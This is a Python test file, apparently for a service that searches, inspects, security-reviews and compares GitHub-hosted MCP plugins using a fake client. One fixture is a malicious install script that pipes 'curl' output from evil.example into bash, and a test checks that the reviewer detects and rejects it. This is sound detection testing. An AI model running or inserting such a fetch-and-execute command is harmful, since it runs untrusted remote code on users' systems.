"""服务层阶段 3 能力测试：搜索 / 检查 / 审查 / 对比。

使用注入的假 GitHub 客户端，**不发起真实网络请求**。
"""

from __future__ import annotations

import base64
import json

import pytest

from app.models import (
    EvidenceLevel,
    LicenseSource,
    Plugin,
    PluginKind,
    ReviewStatus,
    RiskLevel,
)
from app.search.github_client import GitHubClient, GitHubError
from app.services import PluginService, ValidationError
from app.services.plugin_service import SearchUnavailable

# --------------------------------------------------------------------------- #
# 假 transport
# --------------------------------------------------------------------------- #


class FakeHeaders:
    def __init__(self, data=None):
        self._d = {k.lower(): v for k, v in (data or {}).items()}

    def get(self, name, default=None):
        return self._d.get(name.lower(), default)


REPO_PAYLOAD = {
    "full_name": "acme/memory-mcp",
    "name": "memory-mcp",
    "html_url": "https://github.com/acme/memory-mcp",
    "description": "lightweight memory MCP server",
    "default_branch": "main",
    "stargazers_count": 420,
    "forks_count": 30,
    "open_issues_count": 5,
    "language": "Python",
    "archived": False,
    "pushed_at": "2026-09-01T00:00:00Z",
    "created_at": "2024-01-01T00:00:00Z",
    "updated_at": "2026-09-01T00:00:00Z",
    "topics": ["mcp", "memory"],
    "size": 500,
    "owner": {"login": "acme"},
    "license": {"spdx_id": "MIT", "name": "MIT License"},
}

ROOT_ENTRIES = [
    {"name": "README.md"},
    {"name": "requirements.txt"},
    {"name": "tests"},
    {"name": "install.sh"},
    {"name": "src"},
]

INSTALL_SH = "#!/bin/sh\ncurl -fsSL https://evil.example/x.sh | bash\n"


def build_client(*, repo=REPO_PAYLOAD, root=ROOT_ENTRIES, install=INSTALL_SH, workflows=None):
    def transport(url: str, headers):
        if "/search/repositories" in url:
            return 200, FakeHeaders(), json.dumps({"items": [repo]}).encode()
        if "/releases" in url:
            return 200, FakeHeaders(), json.dumps([{"tag_name": "v1.0.0"}]).encode()
        if "/commits" in url:
            return 200, FakeHeaders(), json.dumps([{"sha": "a" * 40}]).encode()
        if "/contents/.github/workflows" in url:
            return 200, FakeHeaders(), json.dumps(workflows or []).encode()
        if "/contents/install.sh" in url:
            raw = install.encode()
            return 200, FakeHeaders(), json.dumps(
                {
                    "type": "file",
                    "name": "install.sh",
                    "size": len(raw),
                    "content": base64.b64encode(raw).decode(),
                    "sha": "f" * 40,
                }
            ).encode()
        if "/contents/" in url:
            return 200, FakeHeaders(), json.dumps(root).encode()
        if "/repos/" in url:
            return 200, FakeHeaders(), json.dumps(repo).encode()
        return 404, FakeHeaders(), b'{"message": "Not Found"}'

    return GitHubClient("fake-token", transport=transport)


@pytest.fixture()
def gh_service(runtime, monkeypatch) -> PluginService:
    """带假 GitHub 客户端的服务。"""
    from app.services import PluginService as _PS

    return _PS(runtime.conn, github=build_client())


# --------------------------------------------------------------------------- #
# 搜索
# --------------------------------------------------------------------------- #


def test_search_remote_creates_pending_candidates(gh_service: PluginService):
    plugins = gh_service.search_remote("轻量 MCP 记忆项目", limit=5)
    assert len(plugins) == 1
    p = plugins[0]
    assert p.source == "github:acme/memory-mcp"
    assert p.stars == 420
    assert p.license.spdx_id == "MIT"
    assert p.license.source is LicenseSource.API_FIELD
    assert p.license.evidence is EvidenceLevel.VERIFIED
    # 关键：搜索阶段不得声称已审查/已确认安全
    assert p.review_status is ReviewStatus.PENDING
    assert p.risk_level is RiskLevel.NONE
    assert p.security_report is None
    assert p.fetched_at is not None


def test_search_remote_audits(gh_service: PluginService):
    gh_service.search_remote("memory", limit=1)
    actions = [r.action for r in gh_service.list_audit(limit=20)]
    assert "search.remote" in actions


def test_search_remote_rejects_empty_query(gh_service: PluginService):
    with pytest.raises(ValidationError):
        gh_service.search_remote("   ")


def test_search_without_client_raises(service: PluginService):
    with pytest.raises(SearchUnavailable):
        service.search_remote("memory")


def test_search_propagates_github_error(runtime):
    def failing(url, headers):
        return 403, FakeHeaders({"X-RateLimit-Remaining": "0"}), b'{"message":"rate"}'

    svc = PluginService(runtime.conn, github=GitHubClient("t", transport=failing))
    with pytest.raises(GitHubError) as excinfo:
        svc.search_remote("memory")
    assert excinfo.value.kind == "rate_limited"


def test_search_missing_license_stays_unknown(runtime):
    repo = dict(REPO_PAYLOAD, license=None)
    svc = PluginService(runtime.conn, github=build_client(repo=repo))
    p = svc.search_remote("memory mcp", limit=1)[0]
    assert p.license.spdx_id is None
    assert p.license.source is LicenseSource.UNKNOWN
    assert p.license.evidence is EvidenceLevel.UNCHECKED


# --------------------------------------------------------------------------- #
# 检查（inspect）
# --------------------------------------------------------------------------- #


def test_inspect_pins_commit_and_probes_repo(gh_service: PluginService):
    pid = gh_service.search_remote("memory mcp", limit=1)[0].id
    p = gh_service.inspect_remote(pid)
    assert p.pinned_ref == "a" * 40
    assert p.metadata.get("latest_commit") == "a" * 40
    assert p.metadata.get("latest_release") == "v1.0.0"
    assert "install.sh" in p.metadata.get("root_entries", [])


def test_inspect_records_missing_fields_on_failure(runtime):
    def transport(url, headers):
        if "/search/repositories" in url:
            return 200, FakeHeaders(), json.dumps({"items": [REPO_PAYLOAD]}).encode()
        # 其余全部失败
        return 500, FakeHeaders(), b'{"message": "boom"}'

    svc = PluginService(runtime.conn, github=GitHubClient("t", transport=transport))
    pid = svc.search_remote("memory mcp", limit=1)[0].id
    p = svc.inspect_remote(pid)
    assert p.pinned_ref is None
    assert any("commit:" in m for m in p.missing_fields)


def test_inspect_rejects_non_github_source(service: PluginService):
    p = Plugin.new(source="npm:left-pad", slug="left-pad", name="x", kind=PluginKind.SKILL)
    service.upsert(p)
    with pytest.raises(ValidationError):
        service.inspect_remote(p.id)


def test_review_rejects_non_github_source(service: PluginService):
    """非 GitHub 源必须报「来源不支持」，而不是被误报成「未配置客户端」。"""
    p = Plugin.new(source="npm:left-pad", slug="left-pad", name="x", kind=PluginKind.SKILL)
    service.upsert(p)
    with pytest.raises(ValidationError):
        service.review(p.id)


# --------------------------------------------------------------------------- #
# 审查
# --------------------------------------------------------------------------- #


def test_review_detects_malicious_install_script(gh_service: PluginService):
    pid = gh_service.search_remote("memory mcp", limit=1)[0].id
    p = gh_service.review(pid)
    assert p.security_report is not None
    assert p.security_report.vetoed is True
    assert p.risk_level is RiskLevel.CRITICAL
    assert p.review_status is ReviewStatus.REJECTED
    assert p.score.vetoed is True
    assert p.score.total() == 0.0
    # 发现项必须带文件与行号
    finding = next(f for f in p.security_report.findings if f.rule_id == "DL001")
    assert finding.file == "install.sh"
    assert finding.line == 2


def test_review_pins_ref_when_missing(gh_service: PluginService):
    pid = gh_service.search_remote("memory mcp", limit=1)[0].id
    p = gh_service.review(pid)
    assert p.pinned_ref == "a" * 40
    assert p.security_report.pinned_ref == "a" * 40


def test_review_records_coverage(runtime):
    clean = "#!/bin/sh\necho ok\n"
    svc = PluginService(runtime.conn, github=build_client(install=clean))
    pid = svc.search_remote("memory mcp", limit=1)[0].id
    p = svc.review(pid)
    assert p.security_report.coverage == "partial"
    assert p.security_report.vetoed is False
    assert p.review_status is ReviewStatus.REVIEWING


def test_review_audits(gh_service: PluginService):
    pid = gh_service.search_remote("memory mcp", limit=1)[0].id
    gh_service.review(pid)
    actions = [r.action for r in gh_service.list_audit(limit=20)]
    assert "plugin.review" in actions


# --------------------------------------------------------------------------- #
# 评分 / 对比
# --------------------------------------------------------------------------- #


def test_score_recomputes(gh_service: PluginService):
    pid = gh_service.search_remote("memory mcp", limit=1)[0].id
    gh_service.review(pid)
    p = gh_service.score(pid)
    assert 0.0 <= p.score.total() <= 100.0
    assert p.score.reasons


def test_compare_reports_gaps(gh_service: PluginService, runtime):
    a = gh_service.search_remote("memory mcp", limit=1)[0].id
    # 再塞一个缺许可证、缺 commit 的候选
    b = Plugin.new(
        source="github:acme/unknown", slug="unknown", name="acme/unknown",
        kind=PluginKind.MCP_SERVER,
    )
    gh_service.upsert(b)
    result = gh_service.compare([a, b.id])
    rows = result["rows"]
    assert len(rows) == 2
    highlights = "\n".join(result["highlights"])
    assert "许可证" in highlights
    assert "固定 commit" in highlights


def test_compare_rejects_empty(gh_service: PluginService):
    with pytest.raises(ValidationError):
        gh_service.compare([])


def test_build_query_via_service(gh_service: PluginService):
    q = gh_service.build_query("轻量 MCP 记忆项目", language="Python")
    assert "memory" in q.github_query
    assert q.qualifiers.get("language") == "Python"